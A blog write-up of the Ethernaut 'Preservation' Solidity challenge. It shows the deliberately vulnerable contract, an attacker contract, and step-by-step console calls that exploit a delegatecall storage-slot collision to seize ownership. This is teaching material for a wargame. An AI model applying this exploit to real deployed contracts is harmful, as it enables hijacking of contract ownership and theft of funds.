---
layout: post
title: Ethernaut - 16. Preservation
date:  2022-09-23
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌕🌑
> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.<br />
The goal of this level is for you to claim ownership of the instance you are given.<br /><br />
Things that might help
- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.


## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## Writeup
The key to solve this level is `delegatecall()`. You can learn the detail in [this website](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-5-calling-other-contracts-visibility-state-access/topic/delegatecall/).
1. Get new instance.
2. Create a new contract
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract PreservationAttacker {
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner; 
        uint storedTime;

        function setTime(uint _time) public {
            owner = msg.sender;
        }
    }
    ```
3. Compile and deploy. My contract address is `0x666EEeb5D57C908b582155D28A2fD46193f07325`.
4. Convert datatype `address` to `uint256` by padding 24 zero to the left of address. I got `0x000000000000000000000000666EEeb5D57C908b582155D28A2fD46193f07325`.
5. Call the method to change address `timeZone1Library` to our malicious contract address.
    ``` javascript

    await contract.setFirstTime('0x000000000000000000000000666EEeb5D57C908b582155D28A2fD46193f07325')

    ```
6. Check `timeZone1Library` address.
    ``` javascript

    await contract.timeZone1Library()
    // '0x666EEeb5D57C908b582155D28A2fD46193f07325'

    ```
7. Call the method to invoke malicous `setTime(uint256)` to change owner to our account address.
    ``` javascript

    await contract.setFirstTime('123')

    ```
8. Check `owner`.
    ``` javascript

    await contract.owner()
    // '0xa450CD84Ac7E1cC1D6c5b28b275B7706E1C4e065' <- my account address!

    ```
9. Submit instance ξ( ✿＞◡❛)
